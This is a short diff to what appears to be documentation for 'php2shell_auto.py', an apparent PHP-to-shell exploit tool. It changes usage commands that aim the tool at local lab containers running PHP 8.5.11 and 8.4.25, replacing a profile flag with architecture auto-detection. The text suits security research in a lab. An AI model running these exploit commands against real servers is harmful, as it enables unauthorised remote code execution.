@@ -86,9 +86,9 @@ Typical wall time is 7-15 seconds on a native host once the image is present.
 # 8.5.11 arm64
 python3 tools/php2shell_auto.py -u http://127.0.0.1:8106/index.php --container p2s-lab-8511 --memory-limit-mb 8
 
-# 8.5.11 amd64 (separate offsets; use the amd64 profile explicitly)
+# 8.5.11 amd64 (separate offsets; --arch is auto-detected for local containers)
 python3 tools/php2shell_auto.py -u http://127.0.0.1:<port>/index.php \
-  --profile 8.5.11-bookworm-amd64 --container <amd64-lab> --memory-limit-mb 8
+  --arch amd64 --container <amd64-lab> --memory-limit-mb 8
 
 # 8.4.25 is probabilistic: keep the default retries
 python3 tools/php2shell_auto.py -u http://127.0.0.1:<port>/index.php \
